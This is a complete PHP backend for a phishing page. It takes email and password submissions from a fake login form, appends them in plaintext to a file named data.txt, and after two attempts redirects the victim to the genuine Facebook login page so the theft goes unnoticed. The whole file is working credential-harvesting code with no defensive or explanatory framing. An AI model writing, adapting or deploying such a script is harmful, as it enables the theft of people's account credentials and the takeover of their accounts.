<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Initialize submission count if not set
    if (!isset($_SESSION['submission_count'])) {
        $_SESSION['submission_count'] = 0;
    }

    // Increment the submission count
    $_SESSION['submission_count']++;

    // Get the email and password from the POST request
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Data to be saved
    $data = "Email: " . $email . ", Password: " . $password . "\n";

    // Path to the file where the data will be saved
    $file = 'data.txt';

    // Save the data to the file
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Check the submission count
    if ($_SESSION['submission_count'] >= 2) {
        // Redirect to the official Facebook login page after 2 submissions
        header("Location: https://www.facebook.com/login.php");
        exit();
    } else {
        // Redirect back to the form or show a message after the first submission
        header("Location: index.html");
        exit();
    }
}
?>
